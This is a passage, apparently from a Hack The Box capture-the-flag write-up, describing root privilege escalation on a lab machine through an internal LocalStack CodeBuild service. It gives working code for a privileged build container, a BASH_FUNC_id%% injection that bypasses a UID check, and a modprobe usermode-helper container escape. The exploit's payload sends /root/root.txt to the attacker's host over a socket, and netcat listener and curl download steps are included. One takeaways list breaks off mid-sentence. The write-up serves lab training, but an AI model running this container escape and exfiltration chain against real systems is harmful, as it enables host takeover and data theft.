    "environmentVariables": [
      {"name": "BASH_FUNC_id%%",
       "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
       "type": "PLAINTEXT"}
    ]
  },
  "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
}
print(json.dumps(project))
' > project.json
```

3. **Register the Project**: Submit our project configuration using the local AWS CLI tools on the compromised worker node targeting LocalStack:

```
aws --endpoint-url http://floci:4566 --region us-east-1 \
  codebuild create-project --cli-input-json file://project.json
```

4. **Start the Listener**: On your attacker machine, start a netcat listener listening on port 9005:

```
rlwrap nc -lvnp 9005
```

5. **Start the Build**: Trigger the privileged container build execution from our worker terminal shell:

```
aws --endpoint-url http://floci:4566 --region us-east-1 \
  codebuild start-build --project-name nimbus-exploit
```

**Verification:**

Once the container launches, writes to /proc/sys/kernel/modprobe, and triggers the kernel format failure, our attacker listener catches the connection and dumps the root flag:

```
listening on [any] 9005 ...
connect to [10.10.14.99] from [10.129.15.31] 38456
f3a749XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

We have successfully compromised the machine!

## Key Takeaways

- **Validate Exploit Logic in Isolation First**: Testing the Python reverse shell locally allows us to isolate script bugs from network constraints, significantly narrowing down the troubleshooting scope.
- **Filter Gaps**: While the app implemented two separate validation steps (suffix check and SSRF blocklist), each check

---

# Privilege Escalation: User to Root (Alternate)

Now that we have our initial foothold as a standard user, it's time to escalate our privileges to root. This phase of the box involves a fascinating chain of container escapes and internal service exploitation. This is an alt root method.

## Understanding the Attack Path

Before we run the exploit, let's break down the vulnerability chain. Our goal is to escape a containerized environment to get code execution as root on the main host.

Here is the high-level roadmap of what we are going to do:

1. **Internal LocalStack Discovery:** The machine is running an internal instance of LocalStack (an AWS cloud emulator) on port 4566. Crucially, IAM enforcement is disabled (ENFORCE_IAM=false), and the CodeBuild service is exposed.
2. **Privileged CodeBuild Project:** We can interact with CodeBuild to spin up a new container (floci/floci:latest). Because we control the build parameters, we can set privilegedMode: true, which grants our new container CAP_SYS_ADMIN (extremely high privileges).
3. **Entrypoint UID-Drop Bypass:** The container's entrypoint script tries to drop our privileges. We can bypass this by injecting an environment variable (BASH_FUNC_id%%). This overrides the id command, tricking the entrypoint into believing we are already uid=0 (root).
4. **Kernel Usermode-Helper Escape (Modprobe):** Because our container is privileged, we have write access to /proc/sys/kernel/modprobe. We can use a classic container escape here:
    - We find where our container's files physically live on the host by looking at the overlay filesystem's upperdir.
    - We write a reverse-shell payload to our container.
    - We overwrite the host's modprobe path to point to our payload on the host's physical filesystem.
    - We trigger the exploit by running a dummy file with an unknown magic header (e.g., \xff\xff\xff\xff). The host kernel doesn't know how to run this file, so it calls our malicious "modprobe" script as the host's root user!

## The Exploit Script

To automate this entire process, we will write a Python script using the boto3 library to interact with the internal LocalStack API.

On your **personal attacker machine**, create a file named exploit.py and paste the following code.

> **Note:** Make sure to replace <YOUR_VPN_IP> with your actual HTB tun0 IP address!

```python
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "<YOUR_VPN_IP>"   # <-- CHANGE THIS to your tun0 IP
LPORT = 9005

# This is the bash script that will be executed inside the CodeBuild container
buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        # 1. Create the python payload to send the root flag over a socket
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('{ATTACKER_IP}', {LPORT}))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        # 2. Find the host-side path to our container's filesystem (upperdir)
        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
        # 3. Overwrite the kernel modprobe path with our payload's host path
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - |
        # 4. Trigger the exploit by executing an unknown binary format
        printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

# Initialize the boto3 CodeBuild client pointing to the internal LocalStack
cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)

# Create and configure the malicious CodeBuild project
cb.create_project(
    name="nimbus-exploit",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,  # Crucial for CAP_SYS_ADMIN
        "environmentVariables": [
            # The Bash function injection to bypass the entrypoint UID drop
            {"name": "BASH_FUNC_id%%",
             "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
             "type": "PLAINTEXT"}
        ],
    },
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)

# Trigger the build process
resp = cb.start_build(projectName="nimbus-exploit")
print("Exploit started. Build ID:", resp["build"]["id"])
```

## Executing the Attack

With the script ready, we need to transfer it to the victim machine and catch the flag.

### 1. Host the Script & Start a Listener

Open two terminals on your **local machine**.

In the first terminal, start a Python web server in the directory where you saved exploit.py:

```
python3 -m http.server 8080
```

In the second terminal, start a Netcat listener to catch the flag that will be sent by our exploit:

```
nc -lnvp 9005
```

### 2. Download the Exploit to the Target

Drop back into your initial reverse shell on the **victim machine**, navigate to a writable directory like /tmp, and download the script using curl:

```
cd /tmp
curl http://<YOUR_VPN_IP>:8080/exploit.py -o exploit.py
```

### 3. Fire!

Still on the victim machine, run the Python script:

```
python3 exploit.py
```

_Expected Output:_

```
Exploit started. Build ID: nimbus-exploit:...
```

### 4. Catch the Flag

Switch back to the terminal on your local machine running the Netcat listener. Within a few seconds, the CodeBuild container will spin up, execute the modprobe escape, and send the contents of root.txt directly to your listener!

```
nc -lnvp 9005
listening on [any] 9005 ...
connect to [10.10.14.X] from (UNKNOWN) [10.10.11.X]
***************************
Connection closed
```

You've successfully captured the root flag!

_(Note: With a few slight modifications to the Python payload inside the buildspec, you could easily alter this to catch a full interactive reverse shell instead of just reading the file)._








